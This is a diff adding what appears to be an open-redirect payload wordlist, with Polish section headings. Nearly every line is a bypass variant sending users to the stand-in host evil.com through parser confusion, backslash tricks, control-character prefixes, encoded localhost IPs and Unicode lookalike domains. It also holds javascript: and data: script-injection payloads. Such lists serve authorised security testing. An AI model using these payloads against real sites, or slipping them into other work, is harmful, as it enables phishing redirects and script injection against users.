@@ -1,0 +1,39 @@
+# === Bezpośrednie URL-e ===
+https://evil.com
+https://evil.com/
+//evil.com
+//evil.com/
+\\evil.com
+\/\/evil.com
+//evil.com/%2e%2e
+
+# === Z domeną docelową w userinfo (mylenie parsera) ===
+https://target.com@evil.com
+https://target.com.evil.com
+https://evil.com#target.com
+https://evil.com?target.com
+https://evil.com\@target.com
+
+# === Backslash bypass (Chrome/Firefox parsują różnie) ===
+/\evil.com
+/\\evil.com
+/\/evil.com
+
+# === Whitespace / control chars ===
+%09//evil.com
+%0d%0a//evil.com
+%00//evil.com
+ //evil.com
+
+# === Protocol smuggling ===
+javascript:alert(document.domain)
+data:text/html,<script>alert(1)</script>
+
+# === IP fallback ===
+//127.0.0.1
+//2130706433
+//0x7f000001
+
+# === Unicode confusion ===
+//evil。com
+//ⓔⓥⓘⓛ.com
